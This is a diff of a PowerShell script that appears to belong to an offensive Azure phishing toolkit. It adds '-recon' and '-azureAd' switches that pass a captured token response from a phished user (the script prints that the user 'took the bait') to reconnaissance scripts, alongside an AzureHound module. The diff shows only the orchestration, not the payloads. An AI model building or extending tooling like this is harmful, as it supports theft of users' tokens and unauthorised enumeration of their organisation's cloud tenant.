@@ -1,7 +1,11 @@
 [CmdletBinding()]
 param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [switch]$azureHound
+    [switch]$azureHound,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$recon,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$azureAd
 )
 
 $modules = .\Scripts\Import.ps1
@@ -38,6 +42,18 @@ Write-Output "$user took the bait."
 $switch = "$user"
 $switch | Out-File -Path .\target.txt 
 
+if($azureAd){
+    Write-Output "Starting Azurehound module..."
+    # .\Recon.ps1 -accessToken $access -refreshToken $refresh
+    .\azuread.ps1 -response $response
+}
+
+if($recon){
+    Write-Output "Starting Azurehound module..."
+    # .\Recon.ps1 -accessToken $access -refreshToken $refresh
+    .\Recon.ps1 -response $response
+}
+
 # AzureHound
 if($azureHound){
     Write-Output "Starting Azurehound module..."
@@ -45,7 +61,7 @@ if($azureHound){
 }
 
 
-Read-Host "Not done with you yet, hoss."
+# Read-Host "Not done with you yet, hoss."
 
 # # Initialize or wait for $response to be set
 # $response = $null
